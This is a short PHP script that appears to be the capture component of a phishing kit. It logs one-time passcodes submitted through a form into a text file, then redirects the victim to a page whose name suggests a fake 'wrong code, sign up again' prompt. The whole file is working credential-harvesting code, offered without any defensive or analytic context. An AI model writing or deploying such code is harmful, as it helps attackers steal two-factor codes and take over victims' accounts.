<?php

file_put_contents("otp.txt", "OTP: " . $_POST['otp'] ."\n"."###########################". "\n", FILE_APPEND);
header('Location: rongfofsingup.html');
exit();
?>
